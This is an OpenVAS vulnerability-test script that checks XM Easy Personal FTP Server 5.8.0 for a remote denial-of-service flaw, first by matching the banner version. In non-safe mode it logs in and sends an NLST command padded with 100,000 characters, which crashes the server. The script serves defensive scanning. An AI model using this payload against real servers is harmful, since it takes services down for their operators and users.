###############################################################################
# OpenVAS Vulnerability Test
# $Id: xm_easy_ftp_37008.nasl 7573 2017-10-26 09:18:50Z cfischer $
#
# XM Easy Personal FTP Server 'NLST' Command Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "XM Easy Personal FTP Server is prone to a remote denial-of-service
vulnerability.

This issue allows remote attackers to crash affected FTP servers,
denying service to legitimate users.

XM Easy Personal FTP Server 5.8.0 is vulnerable; other versions may
also be affected.";


if (description)
{
 script_id(100342);
 script_version("$Revision: 7573 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2009-11-13 12:21:24 +0100 (Fri, 13 Nov 2009)");
 script_bugtraq_id(37008,36969);
 script_tag(name:"cvss_base", value:"7.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
 script_name("XM Easy Personal FTP Server 'NLST' Command Remote Denial of Service Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/37008");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36969");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/507785");
 script_xref(name : "URL" , value : "http://www.dxm2008.com/");

 script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
 script_family("FTP");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

if(get_kb_item('ftp/'+ftpPort+'/broken'))exit(0);

if(!get_port_state(ftpPort)){
  exit(0);
}

if(safe_checks()) {

 if( ! banner = get_ftp_banner(port:ftpPort)) exit(0);
 if(egrep(pattern: "Welcome to DXM's FTP Server", string:banner)) {

   version = eregmatch(pattern: "Welcome to DXM's FTP Server ([0-9.]+)", string: banner); 

   if( ! isnull(version[1])) {
     if(version_is_equal(version: version[1], test_version: "5.8.0")) {
       security_message(port:ftpPort);
       exit(0);
     }  
   }
 }

} else {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1){
    exit(0);
  }

  domain = get_kb_item("Settings/third_party_domain");
  if(isnull(domain)) {
   domain = this_host_name();;
  }

  user = get_kb_item("ftp/login");
  pass = get_kb_item("ftp/password");

  if(!user)user = "anonymous";
  if(!pass)pass = string("openvas@", domain);;

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details)
  {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    if(ftpPort2)
    {
      soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
      if(soc2)
      {
        bo_data = string("NLST ", crap(length: 100000, data:"A"));
        send(socket:soc1, data:bo_data);
        close(soc2);
        close(soc1);

        sleep(2);       

        soc3 = open_sock_tcp(ftpPort);

        if( ! ftp_recv_line(socket:soc3) )
        {
          security_message(port:ftpPort);
    	  close(soc3);
          exit(0);
        }
      }
    }
  }
}
exit(0);
 
